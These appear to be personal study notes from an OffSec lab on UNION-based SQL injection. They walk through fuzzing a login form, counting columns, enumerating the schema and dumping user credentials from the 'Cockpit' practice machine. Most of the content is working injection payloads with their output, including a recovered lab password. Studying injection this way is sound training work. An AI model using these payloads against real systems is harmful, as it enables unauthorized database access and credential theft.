# SQLi Union Select

## Identify SQLi
- When SQL query relies on user input, we can abuse SQLi
- Always try `'` single quote first to see if error is thrown
    1. Try single quote first   `'`
    2.  Simple BOOLEAN
        `offsecUser' OR 1=1 -- // `
    3. If AUTH successful, now we can use arbirtrary code if 
        `' or 1=1 in (select @@version) -- // `
    4. Dump all users data 
        `' OR 1=1 in (SELECT * FROM users) -- // `
    5. Try password column 
        `' or 1=1 in (SELECT password FROM users) -- // `
    6. Add user selection 
        `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // `  
### Fuzzing Payloads
```
# Fuzzing with quick SQLi payloads 
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://192.168.205.10/login.php -p "127.0.0.1:8080:HTTP" 

# Fuzzing special characters 
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d "username=FUZZ&password=bar" -u  http://192.168.205.10/login.php -p "127.0.0.1:8080:HTTP"
```
---
## Union Select Overview
- Enables execution of extra SELECT statement, concatenating two queries into one statement
- Uses the UNION SQL operator to combine results of a malicious query with the original query.
- **Requirements**
	- Matching column count: The injected UNION query has to include the ***same number of columns*** as the original query.
	- Matching Data Types: data types need to be compatible between each column.
	- Inject into VISIBLE column
---
## SQLi Methodology
1. Create error
2. Find Number of Columns in SQL query
3. Determine which column(s) are visible
4. Get name of current DB
5. Query Schema for DB table names, column names
6. Exfil Data from columns by concatenating them
---
## Concatenate 
- If we need to combine several columns into one, we can use ***||*** to  concatentate, or ***CONCAT()*** function
```sql
UNION SELECT CONCAT(username, password_hash) FROM users
UNION SELECT username || password_hash FROM users -- -
UNION SELECT username||':'||password_hash FROM users -- -

# COCKPIT Example
union+select+'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','D5'+from+users--+-
```

---
#### COCKPIT
- https://portal.offsec.com/machine/cockpit-49474/overview/details
- Cockpit was used for the below examples if you want to practice.
---
### 1. Create error
-  Cockpit has a  login page with username and password at `http://192.168.205.10/login.php/`
- In the username field, a single `'` in username field throws SQL error.
- Sending to repeater in burp
- ```bash
    username=admin%27&password=pass
  ```
  - If you look at the POST request, you'll see our single quote/apostrophe, got ENCODED
  - That MEANS, we might have to  ENCODE certain characters requests, to get them to work as well.
### 2. Find Number of Columns
  - Use order to find Number of columns
  - Decrement ORDER BY NUM until you no longer get errors
  - We may have to URL-encode based on what the POST request looks like 
- this syntax seems to work however `' ORDER BY 10-- `  
- HackTrack With mentors Assembling the pieces 2 did a walk through on this box. They used this syntax  `'+ORDER+BY+10--+-` 
- https://static.offsec.com/offsec-courses/HACKTRACK-WITH-MENTORS/Assembling_The_Pieces_2.pdf
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-assembling-the-pieces-part-2-215287/assembling-the-pieces-part-2-215285
```
username='+ORDER+BY+10--+    ## ERROR
username='+ORDER+BY+6--+     ## ERROR
username='+ORDER+BY+5--+     ## WORKING!

Number Columns = 5
``` 

### 3. Find which columns are visible
- Issue the command, in burp, or browser
- Easiest to see if you look at the RENDERED page, 
-  Find the text corresponding to your visible columns
```
'+union+select+'A1','B2','C3','D4','D5'--+-
<<< B2 is Visible >>>
```
### 4. List Current DB
```
username='+union+select+'A1',database(),'C3','D4','D5'--+-
<<<  DB = BlazeDB >>>
```

### 5.  Query Schema for DB, Table, Column Names 

```
# List all tables inside current database
username='+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables--+

# Define WHERE clause to narrow search
username='+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+
<<<   Table_name = users >>> 

# Query for table column names from Schema
username='+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+
<<<   Interesting columns   >>> 
```
### 6. Exfil Data From Columns Using group_concat
```
# Exfiltrate data from columns
'+union+select+'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','D5'+from+users--+-
<<< james@@admin@@canttouchhhthiss@455152 >>>
name = james
username = admin
password = canttouchhhthiss@455152

```

## **Resources**
- https://pentestmonkey.net/category/cheat-sheet/sql-injection 
- https://www.advania.co.uk/blog/security/mysql-sql-injection-practical-cheat-sheet/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet 
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html 